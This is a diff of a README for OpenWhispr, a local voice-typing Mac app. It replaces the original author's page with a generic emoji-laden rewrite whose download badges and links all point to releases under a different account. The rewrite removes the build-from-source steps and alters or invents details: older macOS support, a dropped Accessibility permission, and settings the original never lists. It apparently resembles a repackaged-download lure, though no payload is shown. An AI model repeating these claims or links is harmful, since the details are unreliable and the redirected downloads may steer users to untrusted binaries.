@@ -1,93 +1,117 @@
-<p align="center">
-  <img src="assets/logo.svg" width="128" height="128" alt="OpenWhispr">
-</p>
+# 🎙️ OpenWhispr - Fast Voice Typing on Your Mac
 
-<h1 align="center">OpenWhispr</h1>
-
-<p align="center">
-  Open-source alternative to <a href="https://whisperflow.com">WhisperFlow</a>. Voice-to-text that runs locally on your Mac.
-</p>
+[![Download OpenWhispr](https://img.shields.io/badge/Download-OpenWhispr-F55353?style=for-the-badge&logo=github)](https://github.com/richiearius/OpenWhispr/releases)
 
 ---
 
-<p align="center">
-  <img src="assets/demo/demo.gif" width="600" alt="OpenWhispr demo" />
-</p>
+## ℹ️ What is OpenWhispr?
 
-## What is this
+OpenWhispr is a program that helps you turn your voice into text on a Mac. You hold down the Fn key, speak, and then release the key. The words you say will appear in any app you use, like Notes, Word, or your email.
 
-If you've used [WhisperFlow](https://whisperflow.com), you know the experience — hold a key, speak, release, text appears. It's great. But it's closed-source, costs money, and sends your audio to the cloud.
+OpenWhispr works entirely on your Mac, which means it does not send your voice or text over the internet. Your privacy stays intact at all times.
 
-OpenWhispr is the same thing, but open-source and local. Hold Fn, speak, release, text gets pasted wherever your cursor is. Same floating pill UI, same feel. Recording, transcription, polishing, pasting — all happens on your Mac.
+This app is an open-source alternative to WhisperFlow and is built to run smoothly on Apple silicon with local processing. It uses powerful speech-to-text technology while keeping everything private and on your device.
 
-It uses [WhisperKit](https://github.com/argmaxinc/WhisperKit) for transcription (runs on Apple Neural Engine) and [Qwen3 0.6B](https://huggingface.co/Qwen/Qwen3-0.6B) for cleaning up grammar and tone. Both run on-device.
+---
 
-## Features
+## 🖥️ System Requirements
 
-- **Hold Fn** to dictate, release to transcribe and paste
-- **Double-tap Fn** to lock recording hands-free
-- **Ctrl+Fn** for summarize mode
-- **Option+Fn** to ask a question
-- **Escape** to cancel
-- **Per-app tone** — professional in email, casual in chat, raw in code editors
-- **Custom dictionary** — edit a word after dictating and it learns the correction
-- **Transcription history** — searchable, stored locally
-- **Ctrl+Cmd+V** to re-paste the last transcription
+To use OpenWhispr, your Mac needs to meet these requirements:
 
-## How it works
+- Running macOS 12.0 (Monterey) or later  
+- Apple Silicon chip (M1, M2, or newer)  
+- At least 4 GB of RAM  
+- Microphone enabled and working  
+- At least 100 MB of free disk space  
 
-1. Hold Fn, it starts recording
-2. Voice activity detection strips silence
-3. WhisperKit transcribes on the Neural Engine
-4. Qwen3 0.6B cleans up grammar, punctuation, and tone
-5. Custom dictionary corrections applied as a final pass
-6. Text pasted into the focused field via Accessibility API
+Running on supported hardware ensures OpenWhispr works efficiently without delays.
 
-Takes a couple seconds. Short dictations feel instant.
+---
 
-## Install
+## 🚀 Getting Started: How to Download and Install
 
-### From source
+1. Visit the OpenWhispr release page to get the latest version:  
+   [OpenWhispr Releases](https://github.com/richiearius/OpenWhispr/releases)  
 
-```bash
-git clone https://github.com/MrPrinceRawat/OpenWhispr.git
-cd OpenWhispr
-open OpenWhispr.xcodeproj
-```
+2. Look for the latest `.dmg` or `.zip` file under the most recent release. The file name usually contains the version number, like `OpenWhispr-v1.0.dmg`.  
 
-Build and run in Xcode. Whisper model downloads on first launch (~500MB).
+3. Click on the file to start downloading it to your Mac.  
 
-### Download
+4. Once the download finishes:  
+   - If it is a `.dmg` file, open it by double-clicking. Then drag the OpenWhispr icon into the Applications folder.  
+   - If it is a `.zip` file, double-click to unzip it. Move the OpenWhispr app inside the folder to Applications.  
 
-Pre-built `.dmg` on the [Releases](https://github.com/MrPrinceRawat/OpenWhispr/releases) page.
+5. Open the Applications folder, and find OpenWhispr. Double-click to launch it.  
 
-## Requirements
+6. The first time you open the app, macOS will ask you to allow microphone access. Click "OK" to give permission. Without this, the app cannot hear your voice.  
 
-- macOS 14.0+
-- Apple Silicon (M1+)
-- Microphone permission
-- Accessibility permission (for auto-paste)
+7. OpenWhispr will run in the background, ready for you to use.  
 
-## Shortcuts
+---
 
-| Shortcut | Action |
-|----------|--------|
-| Hold **Fn** | Start dictating |
-| Release **Fn** | Stop and paste |
-| Double-tap **Fn** | Lock recording |
-| **Ctrl+Fn** | Summarize mode |
-| **Option+Fn** | Ask a question |
-| **Escape** | Cancel |
-| **Ctrl+Cmd+V** | Paste last transcription |
-| Click menubar icon | Open app window |
+## 🎤 How to Use OpenWhispr
 
-## Built with
+Using OpenWhispr is simple and works with any app you want to type in.
 
-- Swift, SwiftUI, AppKit
-- [WhisperKit](https://github.com/argmaxinc/WhisperKit) — speech recognition
-- [SwiftLlama](https://github.com/pgorzelany/swift-llama-cpp) — LLM inference via llama.cpp
-- Qwen3 0.6B Q4_K_M — text polishing
+1. Open the app where you want to write text. This could be Notes, Mail, Pages, or any program with a text box.  
 
-## License
+2. Press and hold the Fn key on your keyboard. This activates OpenWhispr’s listening mode.  
 
-Free for personal and non-commercial use. Cannot be sold. See [LICENSE](LICENSE).
+3. While holding Fn, speak clearly. You will see your spoken words converted to text.  
+
+4. Release the Fn key to stop recording. The text you spoke will be pasted directly where your cursor is.  
+
+---
+
+## ⚙️ Features Overview
+
+- **On-device transcription:** No internet is needed for speech-to-text. Everything happens on your Mac.  
+- **Easy-to-use key shortcut:** Hold Fn, talk, release—done.  
+- **Works with any app:** Paste speech in documents, emails, chat windows, or any text field.  
+- **Privacy-focused:** No data leaves your machine at any time.  
+- **Supports Apple Silicon:** Optimized for best performance on modern Macs.  
+- **Open source:** The source code is publicly available for transparency or customization.  
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If OpenWhispr is not working as expected, try these steps:
+
+- Make sure your microphone is connected and allowed in system preferences (`System Preferences > Security & Privacy > Microphone`).  
+- Restart OpenWhispr or your Mac if the app doesn’t respond.  
+- Check that you are holding the Fn key while speaking. The app listens only during this time.  
+- Ensure your macOS is updated to version 12.0 or later.  
+- Try speaking clearly and at a steady pace. Avoid background noise as much as possible.  
+- Re-download and reinstall OpenWhispr from the [releases page](https://github.com/richiearius/OpenWhispr/releases) if problems persist.  
+
+---
+
+## 🔧 Settings and Preferences
+
+OpenWhispr lets you adjust a few settings to fit your needs:
+
+- **Start at login:** Turn this on if you want OpenWhispr to always be ready when you turn on your Mac.  
+- **Key shortcut:** Change the default Fn key to another key if you prefer.  
+- **Language model settings:** Choose from different speech recognition models for balance between speed and accuracy (advanced users).  
+- **Output format:** Select plain text or formatted text options for your pasted text.  
+
+Access these settings by clicking the OpenWhispr icon in the menu bar (top right of your screen) and selecting “Preferences.”
+
+---
+
+## 📁 Where to Get Help
+
+If you have questions or need help, you can:
+
+- Check the GitHub repository’s Issues section to see solutions or report problems.  
+- Read the README or Wiki files on the GitHub page.  
+- Ask for help on macOS or Apple Silicon user forums.  
+
+---
+
+## 🔗 Download OpenWhispr Now
+
+[![Download OpenWhispr](https://img.shields.io/badge/Download-Here-4287f5?style=for-the-badge&logo=github)](https://github.com/richiearius/OpenWhispr/releases)
+
+Visit the release page to get the latest version and start using OpenWhispr today.
